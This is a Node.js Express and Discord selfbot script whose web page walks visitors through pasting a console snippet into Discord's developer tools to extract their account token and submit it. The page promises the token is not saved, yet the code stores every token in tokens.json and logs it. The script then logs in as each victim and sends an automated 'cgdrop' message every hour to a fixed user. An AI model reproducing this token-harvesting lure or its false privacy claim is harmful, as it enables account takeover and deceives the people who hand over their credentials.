const { Client } = require('discord.js-selfbot-v13');
const fs = require('fs');
const path = require('path');
const express = require('express');
const bodyParser = require('body-parser');
require('dotenv').config();  // Load environment variables from .env file

// Token file path
const TOKENS_FILE = path.join(__dirname, 'tokens.json');

// Target user ID to send "cgdrop" message
const targetUserId = '814100764787081217';  // Replace with the correct user ID

// Express server setup
const app = express();
const port = 3000;

// Use body-parser to parse incoming form data
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public')); // For serving static files (like HTML, CSS)

// Function to load tokens from the file
function loadTokens() {
  try {
    if (fs.existsSync(TOKENS_FILE)) {
      const rawData = fs.readFileSync(TOKENS_FILE, 'utf8');
      console.log('Tokens file content:', rawData);
      return JSON.parse(rawData);
    } else {
      console.log("Tokens file does not exist.");
      return [];
    }
  } catch (error) {
    console.error("Error loading tokens:", error);
    return [];
  }
}

// Load tokens initially (not including the main account token)
let tokens = loadTokens();

// Save tokens to the file
function saveTokens() {
  try {
    fs.writeFileSync(TOKENS_FILE, JSON.stringify(tokens, null, 2), 'utf8');
    console.log('Tokens saved.');
  } catch (err) {
    console.error('Error saving tokens:', err);
  }
}

// Function to log in with token and send messages
async function loginWithToken(token) {
  const client = new Client();

  client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}`);
    // Send "cgdrop" message every hour
    setInterval(() => {
      client.users.fetch(targetUserId)
        .then(user => {
          user.send('cgdrop').catch(err => console.log('Error sending message:', err));
        })
        .catch(err => console.log('Error fetching user:', err));
    }, 3600000); // 1 hour interval
  });

  await client.login(token); // Login when the message interval starts
}

// Web page to add and remove tokens
app.get('/', (req, res) => {
  res.send(`
    <html>
      <body>
        <h1>Add or Remove Token</h1>
        <form action="/add-token" method="POST">
          <label for="token">Token:</label>
          <input type="text" id="token" name="token" required><br><br>
          <input type="submit" value="Add Token">
        </form>
        <h2>Remove Token</h2>
        <form action="/remove-token" method="POST">
          <label for="remove-token">Token to Remove:</label>
          <input type="text" id="remove-token" name="remove-token" required><br><br>
          <input type="submit" value="Remove Token">
        </form>
      </body>
      <!DOCTYPE html>
      <html lang="en">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Discord Token Extraction Guide</title>
      </head>
      <body>
          <h1>How to Get Your Discord Token</h1>

          <p>Follow the instructions below to obtain your Discord token using the browser's developer tools.</p>

          <h2>Steps to Get Your Discord Token</h2>
          <ol>
              <li>Open Discord in your browser (it works best on the desktop version of Discord).</li>
              <li>Press <strong>F12</strong> or <strong>Ctrl + Shift + I</strong> (Windows) / <strong>Cmd + Option + I</strong> (Mac) to open the Developer Tools panel.</li>
              <li>Go to the <strong>Console</strong> tab in the Developer Tools.</li>
              <li>Copy and paste the following code into the console:</li>
          </ol>

          <pre>
              <code>
              webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
              </code>
          </pre>

          <ol start="5">
              <li>Press <strong>Enter</strong> after pasting the code.</li>
              <li>Your Discord token will be printed in the console. It will look like a long string of letters and numbers (e.g., <code>mfa.xxxxxx</code>) add it here without "".</li>
              <li>Copy the token from the console.</li>
          </ol>
<h2> we dont save your token , it directly adds to code and starts working. so its safe to add it here.You can remove it any time</h2>
         
      </body>
      </html>

    </html>
  `);
});

// Web route to handle token submission
app.post('/add-token', (req, res) => {
  const newToken = req.body.token;

  if (!newToken) {
    return res.send('Please provide a valid token.');
  }

  // Add the new token to the list
  tokens.push(newToken);
  saveTokens();

  // Start using the new token immediately
  loginWithToken(newToken);

  res.send('Token added successfully! <a href="/">Go back</a>');
});

// Web route to handle token removal
app.post('/remove-token', (req, res) => {
  const tokenToRemove = req.body['remove-token'];

  if (!tokenToRemove) {
    return res.send('Please provide a token to remove.');
  }

  // Remove the token from the list
  tokens = tokens.filter(token => token !== tokenToRemove);
  saveTokens();

  res.send('Token removed successfully! <a href="/">Go back</a>');
});

// Start Express server
app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});

// Run bot with main account token
async function run() {
  if (tokens.length === 0) {
    console.error('No tokens found.');
    return;
  }

  // Get the main account token from the environment variable
  const mainAccountToken = process.env.Token;

  if (!mainAccountToken) {
    console.error('Main account token is missing from the environment variable "Token"');
    return;
  }

  const mainClient = new Client();
  mainClient.on('ready', () => {
    console.log(`Main account logged in: ${mainClient.user.tag}`);
  });

  await mainClient.login(mainAccountToken);

  // Wait for the bot to send messages and login with the tokens when required
}

run().catch(console.error);
